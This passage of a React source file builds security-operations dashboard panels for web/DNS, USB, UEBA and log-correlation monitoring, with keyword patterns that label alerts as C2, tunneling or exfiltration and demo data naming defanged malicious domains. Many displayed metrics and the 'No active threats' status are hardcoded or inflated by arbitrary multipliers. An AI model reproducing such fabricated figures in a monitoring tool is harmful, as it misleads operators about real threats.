                    <span style={{ overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{a.description || fallbackRows[i]?.description}</span>
                    <span>{a.agentName || a.systemId?.name || fallbackRows[i]?.agentName}</span>
                    <span>{a.source || fallbackRows[i]?.source || 'EDR'}</span>
                  </div>
                );
              })}
            </MonitorPanel>
            <MonitorPanel title="Top Affected Endpoints">
              <div style={{ display: 'grid', gridTemplateColumns: '1fr 48px 90px', gap: 8, color: MON.muted, fontSize: 9, fontWeight: 900, padding: '10px 14px' }}>{['Endpoint', 'Alerts', 'Trend (7 Days)'].map(h => <span key={h}>{h}</span>)}</div>
              {endpointRows.map((e, i) => <div key={e.endpoint} style={{ display: 'grid', gridTemplateColumns: '1fr 48px 90px', gap: 8, alignItems: 'center', borderTop: `1px solid ${MON.line}`, padding: '10px 14px', fontSize: 10 }}><b>{e.endpoint}</b><span>{e.alerts}</span>{monitorSpark([2, 5, 3, 6, 4, 7, 5].map(v => v + i), e.color, 'transparent', 22)}</div>)}
            </MonitorPanel>
            <MonitorPanel title="Top Persistence Techniques (MITRE ATT&CK)" right={<span style={{ color: MON.cyan, fontSize: 10, fontWeight: 900 }}>View all</span>}>
              <div style={{ display: 'grid', gridTemplateColumns: '76px 1fr 48px', gap: 8, color: MON.muted, fontSize: 9, fontWeight: 900, padding: '10px 14px' }}>{['Technique', '', 'Alerts'].map((h, i) => <span key={i}>{h}</span>)}</div>
              {techniqueRows.map(([id, label, count]) => <div key={id} style={{ display: 'grid', gridTemplateColumns: '76px 1fr 48px', gap: 8, alignItems: 'center', borderTop: `1px solid ${MON.line}`, padding: '10px 14px', fontSize: 10 }}><b style={{ color: MON.cyan }}>{id}</b><span>{label}</span><span>{count}</span></div>)}
              <div style={{ textAlign: 'right', color: MON.cyan, padding: '8px 14px', fontSize: 10, fontWeight: 900 }}>View all</div>
            </MonitorPanel>
          </div>
          {loading && <div style={{ color: MON.muted, fontSize: 11, textAlign: 'right' }}>Loading backend persistence events...</div>}
        </div>
      </div>
    </SocDashboardShell>
  );
}

function webDnsEventType(alert = {}, index = 0) {
  const text = `${alert.ruleId || ''} ${alert.description || ''} ${alert.tiDomain || ''}`.toLowerCase();
  if (/phish/.test(text)) return 'Phishing';
  if (/c2|command|control/.test(text)) return 'C2 Communication';
  if (/tunnel/.test(text)) return 'DNS Tunneling';
  if (/exfil/.test(text)) return 'Data Exfiltration';
  if (/dns/.test(text)) return 'DNS Query';
  if (/malicious|domain/.test(text)) return 'Malicious Domain';
  return ['Malicious Domain', 'DNS Query', 'Web Request', 'DNS Tunneling', 'Web Request'][index % 5];
}

// 🛡️ 9. Web & DNS Monitoring popup UI
function WebDnsMonitoringDashboardPanel({ alerts = [], loading = false, total = 0 }) {
  const navigate = useNavigate();
  const sorted = [...alerts].sort((a, b) => new Date(b.createdAt || 0) - new Date(a.createdAt || 0));
  const fallbackRows = [
    ['Malicious Domain Detected', 'Domain: badupdate[.]ru', 'high', '10.10.15.23', 'Blocked'],
    ['DNS Tunneling Activity', 'Host: 10.10.15.23', 'high', '10.10.8.45', 'Blocked'],
    ['Phishing Website Access', 'URL: http://secure-login[.]net', 'medium', '10.10.22.31', 'Blocked'],
    ['C2 Communication Detected', 'Domain: c2server[.]info', 'high', '10.10.15.23', 'Blocked'],
    ['Unusual DNS Query Spike', 'Host: 10.10.8.45', 'low', '10.10.5.12', 'Allowed'],
    ['Web Request', 'https://www.microsoft.com | 200 OK', 'low', '10.10.5.12', 'Allowed'],
  ].map(([description, details, severity, srcip, action], i) => ({
    _id: `webdns-fallback-${i}`,
    description,
    details,
    severity,
    srcip,
    actionTaken: action,
    tiDomain: ['badupdate.ru', 'tunnel.example', 'secure-login.net', 'c2server.info', 'google.com', 'microsoft.com'][i],
    createdAt: new Date(Date.now() - i * 105 * 1000).toISOString(),
  }));
  const rows = sorted.length ? sorted : fallbackRows;
  const totalWeb = 1_250_000;
  const totalDns = 2_480_000;
  const blockedWeb = rows.filter(a => a.blocked || a.actionTaken === 'Blocked').length * 1459 || 8753;
  const blockedDns = rows.filter((a, i) => webDnsEventType(a, i).includes('DNS')).length * 1842 || 12892;
  const malicious = rows.filter(a => severityRank(a.severity) >= 2).length * 51 || 356;
  const domains = new Set(rows.map(a => a.tiDomain || a.domain || a.rawEvent?.domain).filter(Boolean)).size * 4108 || 24652;
  const webSeries = [58, 52, 61, 49, 55, 46, 58, 72, 70, 81, 76, 96, 61, 58, 62, 56, 64, 49, 66, 54, 74, 58, 79, 51];
  const dnsSeries = [72, 95, 68, 108, 82, 95, 90, 101, 98, 118, 89, 176, 142, 115, 104, 126, 130, 96, 118, 121, 102, 94, 110, 128];
  const alertCategories = [
    ['Malicious Domain', 126, MON.red], ['Phishing', 86, MON.orange], ['C2 Communication', 54, MON.yellow],
    ['DNS Tunneling', 42, MON.blue], ['Data Exfiltration', 28, MON.cyan], ['Other', 20, '#94a3b8'],
  ];
  const websites = [
    ['youtube.com', 'Streaming', '45,986', '3.67%'], ['google.com', 'Search Engine', '38,745', '3.09%'],
    ['microsoft.com', 'Technology', '27,651', '2.21%'], ['facebook.com', 'Social Media', '23,887', '1.91%'], ['instagram.com', 'Social Media', '19,456', '1.55%'],
  ];
  const queriedDomains = [
    ['google.com', '98,765', '3.98%'], ['microsoft.com', '67,890', '2.74%'], ['amazonaws.com', '45,678', '1.84%'],
    ['cloudflare.net', '33,456', '1.35%'], ['fbcdn.net', '28,765', '1.16%'],
  ];
  const trafficCat = [
    ['Business', 28.5, MON.blue], ['Streaming', 21.7, MON.purple], ['Social Media', 17.2, MON.yellow], ['Technology', 13.8, MON.green], ['News', 7.8, MON.cyan], ['Other', 11.2, '#94a3b8'],
  ];
  const dnsTypes = [
    ['A', 34.3, MON.blue], ['AAAA', 18.7, MON.purple], ['MX', 9.8, MON.yellow], ['TXT', 6.5, MON.orange], ['CNAME', 5.4, MON.green], ['Other', 5.3, '#94a3b8'],
  ];
  const geoRows = [['United States', '245,981'], ['India', '184,765'], ['United Kingdom', '98,765'], ['Germany', '72,466'], ['Canada', '54,321']];
  const kpis = [
    ['Total Web Requests', '1.25 M', '↑ 18.6%', MON.blue, webSeries],
    ['Total DNS Queries', '2.48 M', '↑ 22.4%', MON.purple, dnsSeries],
    ['Blocked Web Requests', blockedWeb.toLocaleString(), '↑ 15.7%', MON.red, webSeries.slice().reverse()],
    ['Blocked DNS Queries', blockedDns.toLocaleString(), '↑ 20.1%', MON.orange, dnsSeries.slice().reverse()],
    ['Malicious Requests', malicious.toLocaleString(), '↑ 28.3%', MON.red, [3, 6, 4, 8, 5, 9, 6, 10, 7, 12, 8, 11]],
    ['Unique Domains Queried', domains.toLocaleString(), '↑ 12.8%', MON.green, [12, 15, 13, 18, 16, 19, 15, 21, 18, 23, 20, 24]],
  ];

  return (
    <SocDashboardShell kind="webdns" active="Overview">
      <div style={{ overflow: 'auto', padding: 8, background: MON.bg, color: MON.text }}>
        <div style={{ minWidth: 1000, display: 'grid', gap: 8 }}>
          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(6, 1fr)', gap: 8 }}>
            {kpis.map(([title, value, change, color, data]) => (
              <section key={title} style={{ border: `1px solid ${MON.border}`, borderRadius: 7, background: 'linear-gradient(135deg, rgba(10,25,48,.98), rgba(6,16,31,.98))', padding: 11, minHeight: 78, overflow: 'hidden' }}>
                <div style={{ display: 'flex', justifyContent: 'space-between', gap: 8, alignItems: 'baseline' }}>
                  <b style={{ color: '#dbeafe', fontSize: 10 }}>{title}</b>
                  <span style={{ color: MON.green, fontSize: 9, fontWeight: 900 }}>{change}</span>
                </div>
                <strong style={{ display: 'block', color: MON.text, fontSize: 22, lineHeight: 1, marginTop: 8 }}>{value}</strong>
                {monitorSpark(data, color, `${color}14`, 26)}
              </section>
            ))}
          </div>

          <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr .95fr', gap: 8 }}>
            <MonitorPanel title="Web Traffic Over Time" right={<span style={{ color: MON.muted, fontSize: 10 }}>Last 24 Hours⌄</span>}>
              <div style={{ padding: 14, height: 162, backgroundImage: 'linear-gradient(rgba(255,255,255,.05) 1px, transparent 1px), linear-gradient(90deg, rgba(255,255,255,.05) 1px, transparent 1px)', backgroundSize: '58px 34px' }}>{monitorSpark(webSeries, MON.blue, 'rgba(20,133,255,.25)', 114)}</div>
            </MonitorPanel>
            <MonitorPanel title="DNS Queries Over Time" right={<span style={{ color: MON.muted, fontSize: 10 }}>Last 24 Hours⌄</span>}>
              <div style={{ padding: 14, height: 162, backgroundImage: 'linear-gradient(rgba(255,255,255,.05) 1px, transparent 1px), linear-gradient(90deg, rgba(255,255,255,.05) 1px, transparent 1px)', backgroundSize: '58px 34px' }}>{monitorSpark(dnsSeries, MON.purple, 'rgba(139,92,246,.25)', 114)}</div>
            </MonitorPanel>
            <MonitorPanel title="Top Alert Categories" right={<span style={{ color: MON.muted, fontSize: 10 }}>Last 24 Hours⌄</span>}>
              <div style={{ display: 'grid', gridTemplateColumns: '145px 1fr', alignItems: 'center', padding: 12 }}>
                <Donut value={35} label={String(malicious)} color={MON.red} accent={MON.orange} />
                <BarList rows={alertCategories.map(([label, value, color]) => ({ label, value, valueLabel: `${value} (${Math.round(value / malicious * 100)}%)`, color }))} />
              </div>
            </MonitorPanel>
          </div>

          <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr .95fr', gap: 8 }}>
            <MonitorPanel title="Top Websites Accessed">
              <div style={{ display: 'grid', gridTemplateColumns: '1fr 120px 84px 72px', gap: 8, color: MON.muted, fontSize: 9, fontWeight: 900, padding: '9px 12px' }}>{['Domain', 'Category', 'Requests', '% of Total'].map(h => <span key={h}>{h}</span>)}</div>
              {websites.map(row => <div key={row[0]} style={{ display: 'grid', gridTemplateColumns: '1fr 120px 84px 72px', gap: 8, borderTop: `1px solid ${MON.line}`, padding: '7px 12px', fontSize: 10 }}><b>{row[0]}</b><span>{row[1]}</span><span>{row[2]}</span><span>{row[3]}</span></div>)}
              <div style={{ color: MON.cyan, fontSize: 10, fontWeight: 900, padding: '8px 12px' }}>View All</div>
            </MonitorPanel>
            <MonitorPanel title="Top Queried Domains (DNS)">
              <div style={{ display: 'grid', gridTemplateColumns: '1fr 100px 72px', gap: 8, color: MON.muted, fontSize: 9, fontWeight: 900, padding: '9px 12px' }}>{['Domain', 'Query Count', '% of Total'].map(h => <span key={h}>{h}</span>)}</div>
              {queriedDomains.map(row => <div key={row[0]} style={{ display: 'grid', gridTemplateColumns: '1fr 100px 72px', gap: 8, borderTop: `1px solid ${MON.line}`, padding: '7px 12px', fontSize: 10 }}><b>{row[0]}</b><span>{row[1]}</span><span>{row[2]}</span></div>)}
              <div style={{ color: MON.cyan, fontSize: 10, fontWeight: 900, padding: '8px 12px' }}>View All</div>
            </MonitorPanel>
            <MonitorPanel title="Recent Alerts" right={<span style={{ color: MON.cyan, fontSize: 10, fontWeight: 900 }}>View All</span>}>
              <div style={{ padding: 10, display: 'grid', gap: 11 }}>
                {rows.slice(0, 5).map((a, i) => {
                  const color = a.severity === 'high' || a.severity === 'critical' ? MON.red : a.severity === 'medium' ? MON.yellow : MON.blue;
                  return <div key={a._id || i} style={{ display: 'grid', gridTemplateColumns: '26px 1fr 58px', gap: 8, alignItems: 'center', fontSize: 10 }}><span style={{ color, fontSize: 18 }}>⚠</span><span style={{ minWidth: 0 }}><b style={{ display: 'block', color, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{a.description || fallbackRows[i]?.description}</b><span style={{ color: MON.muted }}>{a.details || fallbackRows[i]?.details}</span></span><b style={{ color: '#fff', background: color, borderRadius: 5, padding: '3px 6px', textAlign: 'center', fontSize: 9 }}>{a.severity || fallbackRows[i]?.severity}</b></div>;
                })}
              </div>
            </MonitorPanel>
          </div>

          <div style={{ display: 'grid', gridTemplateColumns: '.78fr .78fr 1.15fr 1fr', gap: 8 }}>
            <MonitorPanel title="Web Traffic by Category">
              <div style={{ display: 'grid', gridTemplateColumns: '105px 1fr', alignItems: 'center', padding: 10 }}>
                <Donut value={29} label="1.25 M" color={MON.blue} accent={MON.green} />
                <BarList rows={trafficCat.map(([label, value, color]) => ({ label, value, valueLabel: `${value}%`, color }))} />
              </div>
            </MonitorPanel>
            <MonitorPanel title="DNS Query Types">
              <div style={{ display: 'grid', gridTemplateColumns: '105px 1fr', alignItems: 'center', padding: 10 }}>
                <Donut value={34} label="2.48 M" color={MON.blue} accent={MON.green} />
                <BarList rows={dnsTypes.map(([label, value, color]) => ({ label, value, valueLabel: `${value}%`, color }))} />
              </div>
            </MonitorPanel>
            <MonitorPanel title="Geographic Distribution (Web Requests)">
              <div style={{ display: 'grid', gridTemplateColumns: '1fr 150px', gap: 8, alignItems: 'center', padding: 10 }}>
                <ThreatMap />
                <div><div style={{ display: 'grid', gridTemplateColumns: '1fr 70px', color: MON.muted, fontSize: 9, fontWeight: 900, marginBottom: 6 }}><span>Country</span><span>Requests</span></div>{geoRows.map(([c, v]) => <div key={c} style={{ display: 'grid', gridTemplateColumns: '1fr 70px', fontSize: 10, margin: '5px 0' }}><span>{c}</span><span>{v}</span></div>)}<b style={{ color: MON.cyan, fontSize: 10 }}>View Full Map</b></div>
              </div>
            </MonitorPanel>
            <MonitorPanel title="DNS Security Overview">
              <div style={{ display: 'grid', gridTemplateColumns: '110px 1fr', gap: 12, padding: 16, alignItems: 'center' }}>
                <span style={{ textAlign: 'center', color: MON.green, fontWeight: 900, fontSize: 16 }}><b style={{ display: 'grid', placeItems: 'center', margin: '0 auto 8px', width: 58, height: 58, borderRadius: 30, border: `2px solid ${MON.green}`, color: MON.green }}>♜</b>Protected<br /><small style={{ color: MON.muted }}>No active threats</small></span>
                <div>{[['DNS Servers', '5 / 5 Up'], ['DNS Response Time', '23 ms'], ['Failed Lookups', '0.18%'], ['DNSSEC Validation', 'Enabled'], ['Threat Feeds', 'Connected']].map(([k, v]) => <div key={k} style={{ display: 'grid', gridTemplateColumns: '1fr 72px 16px', gap: 8, fontSize: 10, marginBottom: 8 }}><span>{k}</span><b style={{ color: MON.green }}>{v}</b><span style={{ color: MON.green }}>●</span></div>)}</div>
              </div>
            </MonitorPanel>
          </div>

          <MonitorPanel title="Live Log Feed">
            <div style={{ display: 'grid', gridTemplateColumns: '80px 150px 120px 100px 1fr', gap: 8, color: MON.muted, fontSize: 9, fontWeight: 900, padding: '7px 12px' }}>{['Time', 'Type', 'Source', 'Action', 'Details'].map(h => <span key={h}>{h}</span>)}</div>
            {rows.slice(0, 6).map((a, i) => {
              const type = webDnsEventType(a, i);
              const color = type.includes('DNS') ? MON.orange : type.includes('Malicious') ? MON.red : type.includes('Web') ? MON.blue : MON.yellow;
              return <div key={a._id || i} style={{ display: 'grid', gridTemplateColumns: '80px 150px 120px 100px 1fr', gap: 8, borderTop: `1px solid ${MON.line}`, padding: '5px 12px', fontSize: 10 }}><span>{a.createdAt ? new Date(a.createdAt).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' }) : '10:24:35'}</span><b style={{ color }}>{type}</b><span>{a.srcip || fallbackRows[i]?.srcip}</span><b style={{ color: a.actionTaken === 'Allowed' || fallbackRows[i]?.actionTaken === 'Allowed' ? MON.green : MON.red }}>{a.actionTaken || fallbackRows[i]?.actionTaken}</b><span style={{ color }}>{a.details || a.description || fallbackRows[i]?.details}</span></div>;
            })}
            {loading && <div style={{ color: MON.muted, padding: 12, fontSize: 11 }}>Loading backend web and DNS events...</div>}
          </MonitorPanel>
        </div>
      </div>
    </SocDashboardShell>
  );
}

function usbEventType(alert = {}, index = 0) {
  const text = `${alert.ruleId || ''} ${alert.description || ''} ${alert.device || ''}`.toLowerCase();
  if (/copy|transfer|copied/.test(text)) return /from usb/.test(text) ? 'File Copied from USB' : 'File Copied to USB';
  if (/block|unauthorized|policy/.test(text)) return 'Device Blocked';
  if (/disconnect|remove/.test(text)) return 'Device Disconnected';
  if (/connect|usb|device/.test(text)) return 'Device Connected';
  return ['Device Connected', 'File Copied to USB', 'Device Blocked', 'Device Connected', 'File Copied from USB'][index % 5];
}

// 🛡️ 10. Device Control (USB) Monitoring popup UI
function DeviceControlUsbDashboardPanel({ alerts = [], loading = false, total = 0 }) {
  return <UsbDeviceControlDashboard alerts={alerts} loading={loading} total={total} />;
}

function uebaActivity(alert = {}, index = 0) {
  const text = `${alert.ruleId || ''} ${alert.description || ''} ${alert.userAction || ''}`.toLowerCase();
  if (/travel|geo|location/.test(text)) return 'Impossible Travel Detected';
  if (/download|exfil|dlp|data/.test(text)) return 'Large Data Download';
  if (/admin|privilege|sudo/.test(text)) return 'Unusual Admin Activity';
  if (/failed|login|auth/.test(text)) return 'Multiple Failed Logins';
  if (/access/.test(text)) return 'Access from Unusual Location';
  if (/powershell|suspicious/.test(text)) return 'Suspicious PowerShell Activity';
  return ['Impossible Travel Detected', 'Large Data Download', 'Unusual Admin Activity', 'Multiple Failed Logins', 'Access from Unusual Location', 'Mass File Deletion', 'Data Exfiltration Pattern'][index % 7];
}

// 🛡️ 11. Behavioral Analytics (UEBA) popup UI
function BehavioralAnalyticsUebaDashboardPanel({ alerts = [], loading = false, total = 0 }) {
  const navigate = useNavigate();
  const sorted = [...alerts].sort((a, b) => new Date(b.createdAt || 0) - new Date(a.createdAt || 0));
  const fallbackRows = [
    ['Impossible Travel Detected', 'ajay.kumar', 95, 'new', 'United States'],
    ['Large Data Download', 'priya.sharma', 92, 'new', 'Russia'],
    ['Unusual Admin Activity', 'admin.svc', 90, 'in progress', 'China'],
    ['Multiple Failed Logins', 'rohit.verma', 85, 'new', 'Germany'],
    ['Access from Unusual Location', 'neha.patel', 83, 'new', 'Netherlands'],
    ['Mass File Deletion', 'vikas.mishra', 80, 'in progress', 'India'],
    ['Suspicious PowerShell Activity', 'john.doe', 78, 'new', 'United Kingdom'],
    ['Data Exfiltration Pattern', 'backup.svc', 97, 'new', 'United States'],
  ].map(([description, username, riskScore, status, geoCountry], i) => ({
    _id: `ueba-fallback-${i}`,
    description,
    username,
    riskScore,
    status,
    geoCountry,
    severity: riskScore >= 90 ? 'high' : riskScore >= 80 ? 'medium' : 'low',
    createdAt: new Date(Date.now() - i * 53 * 60 * 1000).toISOString(),
  }));
  const rows = sorted.length ? sorted : fallbackRows;
  const totalEvents = total || rows.length || 1248;
  const highRiskUsers = new Set(rows.filter(a => severityRank(a.severity) >= 2).map(a => a.username || a.rawEvent?.username || a.agentName).filter(Boolean)).size || 56;
  const anomalousDevices = new Set(rows.map(a => a.device || a.agentName || a.systemId?.name).filter(Boolean)).size || 37;
  const dlpRisk = rows.filter((a, i) => /download|exfil|data/i.test(uebaActivity(a, i))).length * 5 || 23;
  const uebaAlerts = rows.length * 51 || 412;
  const riskSeries = [82, 108, 95, 118, 101, 92, 125, 188, 118, 142, 101, 84, 78, 92, 88, 141, 135, 92, 87, 111, 88, 102, 82, 71];
  const mediumSeries = riskSeries.map(v => Math.round(v * .65));
  const lowSeries = riskSeries.map(v => Math.round(v * .38));
  const users = groupCounts(rows, a => a.username || a.rawEvent?.username || a.agentName || 'Unknown', 5)
    .map((r, i) => ({ user: r.label, score: [95, 92, 85, 83, 80][i] || 72, color: [MON.red, MON.red, MON.orange, MON.yellow, MON.yellow][i] }));
  const categoryRows = [
    ['♙', 'User Behavior', 356, '↑ 24.5%', MON.blue], ['▱', 'Endpoint Behavior', 287, '↑ 19.3%', MON.purple],
    ['◎', 'Network Behavior', 234, '↑ 17.8%', MON.green], ['▰', 'Data Access', 201, '↑ 15.2%', MON.yellow],
    ['♙', 'Authentication', 170, '↑ 21.1%', '#22d3ee'], ['☁', 'Cloud Activity', 142, '↑ 18.7%', MON.blue],
    ['✉', 'Email Behavior', 118, '↑ 16.2%', '#94a3b8'], ['▤', 'Application Behavior', 96, '↑ 14.4%', MON.purple],
    ['▭', 'Server Behavior', 81, '↑ 12.9%', '#94a3b8'], ['⊕', 'Other', 63, '↑ 10.3%', '#94a3b8'],
  ];
  const geoRows = [['United States', 142], ['Russia', 96], ['China', 68], ['Germany', 45], ['Netherlands', 32]];
  const dlpChannels = [['Web Upload', 38, MON.red], ['Email', 27, MON.orange], ['USB Device', 18, MON.yellow], ['Cloud Storage', 12, MON.green], ['Other', 5, MON.blue]];
  const kpis = [
    ['!', 'RISKY EVENTS', shortNum(totalEvents), '↑ 32.6% vs yesterday', MON.red],
    ['♙', 'HIGH RISK USERS', shortNum(highRiskUsers), '↑ 18.4% vs yesterday', MON.orange],
    ['▱', 'ANOMALOUS DEVICES', shortNum(anomalousDevices), '↑ 15.2% vs yesterday', MON.purple],
    ['▤', 'DATA EXFILTRATION RISK', shortNum(dlpRisk), '↑ 21.7% vs yesterday', MON.yellow],
    ['♧', 'UEBA ALERTS', shortNum(uebaAlerts), '↑ 28.1% vs yesterday', MON.red],
  ];
  const scoreColor = score => score >= 90 ? MON.red : score >= 80 ? MON.orange : MON.yellow;

  return (
    <SocDashboardShell kind="ueba" active="UEBA Dashboard">
      <div style={{ overflow: 'auto', padding: 8, background: MON.bg, color: MON.text }}>
        <div style={{ minWidth: 1000, display: 'grid', gap: 8 }}>
          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(5, 1fr)', gap: 8 }}>
            {kpis.map(([icon, title, value, sub, color]) => (
              <section key={title} style={{ minHeight: 92, border: `1px solid ${MON.border}`, borderRadius: 8, background: `linear-gradient(135deg, ${color}12, rgba(10,25,48,.96) 42%, rgba(6,16,31,.98))`, padding: 14, display: 'grid', gridTemplateColumns: '42px 1fr', gap: 13, alignItems: 'center' }}>
                <span style={{ width: 40, height: 40, borderRadius: 10, display: 'grid', placeItems: 'center', color, background: `${color}18`, border: `1px solid ${color}35`, fontSize: 20 }}>{icon}</span>
                <span><b style={{ color: '#dbeafe', fontSize: 10 }}>{title}</b><strong style={{ display: 'block', fontSize: 25, lineHeight: 1, marginTop: 8 }}>{value}</strong><small style={{ color, fontWeight: 800 }}>{sub}</small></span>
              </section>
            ))}
          </div>

          <div style={{ display: 'grid', gridTemplateColumns: '1.42fr 1fr', gap: 8 }}>
            <MonitorPanel title="Anomalous Events Over Time" right={<span style={{ color: MON.muted, fontSize: 10 }}>Last 24 Hours⌄</span>}>
              <div style={{ padding: 16, height: 218, backgroundImage: 'linear-gradient(rgba(255,255,255,.05) 1px, transparent 1px), linear-gradient(90deg, rgba(255,255,255,.05) 1px, transparent 1px)', backgroundSize: '58px 36px' }}>
                {monitorSpark(riskSeries, MON.red, 'rgba(255,49,94,.12)', 58)}
                {monitorSpark(mediumSeries, MON.orange, 'rgba(255,138,31,.10)', 58)}
                {monitorSpark(lowSeries, MON.blue, 'rgba(20,133,255,.10)', 58)}
              </div>
            </MonitorPanel>
            <MonitorPanel title="Top UEBA Alerts" right={<span style={{ color: MON.cyan, fontSize: 10, fontWeight: 900 }}>View All</span>}>
              <div style={{ display: 'grid', gridTemplateColumns: '1fr 115px 70px 70px 72px', gap: 8, color: MON.muted, fontSize: 9, fontWeight: 900, padding: '10px 14px' }}>{['ALERT NAME', 'USER / ENTITY', 'RISK SCORE', 'TIME', 'STATUS'].map(h => <span key={h}>{h}</span>)}</div>
              {rows.slice(0, 8).map((a, i) => {
                const score = a.riskScore || [95, 92, 90, 85, 83, 80, 78, 97][i];
                return <div key={a._id || i} style={{ display: 'grid', gridTemplateColumns: '1fr 115px 70px 70px 72px', gap: 8, borderTop: `1px solid ${MON.line}`, padding: '7px 14px', fontSize: 10, alignItems: 'center' }}><b>● {uebaActivity(a, i)}</b><span>{a.username || a.rawEvent?.username || fallbackRows[i]?.username}</span><b style={{ color: '#fff', background: scoreColor(score), borderRadius: 4, padding: '2px 6px', textAlign: 'center' }}>{score}</b><span>{a.createdAt ? new Date(a.createdAt).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }) : '10:24:15'}</span><span style={{ color: '#fff', background: /progress/i.test(a.status || '') ? MON.orange : MON.red, borderRadius: 4, padding: '2px 5px', textAlign: 'center', fontSize: 9 }}>{a.status || fallbackRows[i]?.status}</span></div>;
              })}
            </MonitorPanel>
          </div>

          <div style={{ display: 'grid', gridTemplateColumns: '.82fr .82fr 1.7fr', gap: 8 }}>
            <MonitorPanel title="Behavior Risk Distribution">
              <div style={{ display: 'grid', gridTemplateColumns: '145px 1fr', alignItems: 'center', padding: 14 }}>
                <Donut value={49} label={shortNum(totalEvents)} color={MON.red} accent={MON.orange} />
                <BarList rows={[
                  { label: 'High Risk', value: 286, valueLabel: '286 (34.9%)', color: MON.red },
                  { label: 'Medium Risk', value: 661, valueLabel: '661 (45%)', color: MON.orange },
                  { label: 'Low Risk', value: 338, valueLabel: '338 (27%)', color: MON.blue },
                ]} />
              </div>
            </MonitorPanel>
            <MonitorPanel title="Top Risky Users" right={<span style={{ color: MON.cyan, fontSize: 10, fontWeight: 900 }}>View All</span>}>
              <div style={{ display: 'grid', gridTemplateColumns: '1fr 70px 88px', gap: 8, color: MON.muted, fontSize: 9, fontWeight: 900, padding: '10px 14px' }}>{['USER', 'RISK SCORE', 'TREND'].map(h => <span key={h}>{h}</span>)}</div>
              {users.map((u, i) => <div key={u.user} style={{ display: 'grid', gridTemplateColumns: '1fr 70px 88px', gap: 8, alignItems: 'center', borderTop: `1px solid ${MON.line}`, padding: '9px 14px', fontSize: 10 }}><b>♙ {u.user}</b><b style={{ color: '#fff', background: u.color, borderRadius: 4, padding: '2px 6px', textAlign: 'center' }}>{u.score}</b>{monitorSpark([1, 4, 2, 5, 3, 6, 4].map(v => v + i), u.color, 'transparent', 20)}</div>)}
            </MonitorPanel>
            <MonitorPanel title="Risk by Category" right={<span style={{ color: MON.cyan, fontSize: 10, fontWeight: 900 }}>View All</span>}>
              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(5, 1fr)', gap: 12, padding: 16 }}>
                {categoryRows.map(([icon, label, value, change, color]) => <div key={label} style={{ textAlign: 'center' }}><div style={{ color, fontSize: 21 }}>{icon}</div><b style={{ display: 'block', fontSize: 10, marginTop: 5 }}>{label}</b><strong style={{ display: 'block', fontSize: 15, marginTop: 4 }}>{value}</strong><small style={{ color }}>{change}</small></div>)}
              </div>
            </MonitorPanel>
          </div>

          <div style={{ display: 'grid', gridTemplateColumns: '.88fr .86fr 1.26fr', gap: 8 }}>
            <MonitorPanel title="Geolocation Anomalies" right={<span style={{ color: MON.cyan, fontSize: 10, fontWeight: 900 }}>View All</span>}>
              <div style={{ display: 'grid', gridTemplateColumns: '1fr 130px', gap: 8, padding: 10, alignItems: 'center' }}>
                <ThreatMap auth />
                <div>{geoRows.map(([country, events]) => <div key={country} style={{ display: 'grid', gridTemplateColumns: '1fr 40px', fontSize: 10, marginBottom: 9 }}><span>{country}</span><b>{events}</b></div>)}</div>
              </div>
            </MonitorPanel>
            <MonitorPanel title="Data Exfiltration Risk" right={<span style={{ color: MON.cyan, fontSize: 10, fontWeight: 900 }}>View All</span>}>
              <div style={{ padding: 14, display: 'grid', gridTemplateColumns: '82px 1fr', gap: 12 }}>
                <div><small>Total DLP Events</small><strong style={{ display: 'block', fontSize: 24, color: MON.yellow }}>{dlpRisk}</strong><small style={{ color: MON.yellow }}>↑ 21.7% vs yesterday</small><br /><br /><small>High Risk Events</small><strong style={{ display: 'block', fontSize: 24, color: MON.red }}>9</strong><small style={{ color: MON.red }}>↑ 28.6% vs yesterday</small></div>
                <BarList rows={dlpChannels.map(([label, value, color]) => ({ label, value, valueLabel: `${value}%`, color }))} />
              </div>
            </MonitorPanel>
            <MonitorPanel title="Recent Anomalous Activities" right={<span style={{ color: MON.cyan, fontSize: 10, fontWeight: 900 }}>View All</span>}>
              {rows.slice(0, 5).map((a, i) => {
                const score = a.riskScore || [95, 92, 90, 85, 83][i];
                return <div key={a._id || i} style={{ display: 'grid', gridTemplateColumns: '70px 1fr 110px 48px', gap: 8, borderBottom: `1px solid ${MON.line}`, padding: '10px 14px', fontSize: 10 }}><span>{a.createdAt ? new Date(a.createdAt).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }) : '10:24:15'}</span><span>{uebaActivity(a, i)}</span><b>{a.username || a.rawEvent?.username || fallbackRows[i]?.username}</b><b style={{ color: '#fff', background: scoreColor(score), borderRadius: 4, textAlign: 'center' }}>{score}</b></div>;
              })}
            </MonitorPanel>
          </div>
          {loading && <div style={{ color: MON.muted, fontSize: 11, textAlign: 'right' }}>Loading backend UEBA events...</div>}
        </div>
      </div>
    </SocDashboardShell>
  );
}

function correlationRuleName(alert = {}, index = 0) {
  const text = `${alert.ruleId || ''} ${alert.description || ''}`.toLowerCase();
  if (/brute|failed login/.test(text)) return 'Brute Force Success';
  if (/admin|new ip/.test(text)) return 'Admin Login from New IP';
  if (/powershell|outbound/.test(text)) return 'PowerShell + Outbound';
  if (/dns|domain/.test(text)) return 'DNS Suspicious Domain';
  if (/exfil|upload|data/.test(text)) return 'Data Exfiltration';
  if (/policy/.test(text)) return 'Policy Change Detected';
  return ['Brute Force Success', 'Admin Login from New IP', 'PowerShell + Outbound', 'DNS Suspicious Domain', 'Multiple Failed Logins', 'Policy Change Detected', 'Potential Data Exfiltration'][index % 7];
}

// 🛡️ 12. Log Monitoring & Correlation popup UI
function LogMonitoringCorrelationDashboardPanel({ alerts = [], loading = false, total = 0 }) {
  const sorted = [...alerts].sort((a, b) => new Date(b.createdAt || 0) - new Date(a.createdAt || 0));
  const fallbackRows = [
    ['critical', 'Brute Force Success', '10 failed logins followed by success', 'Windows Server 01', 'john.doe', '185.199.108.23', 'active'],
    ['high', 'Admin Login from New IP', 'Admin login from unusual location', 'AWS Console', 'admin', '203.0.113.45', 'active'],
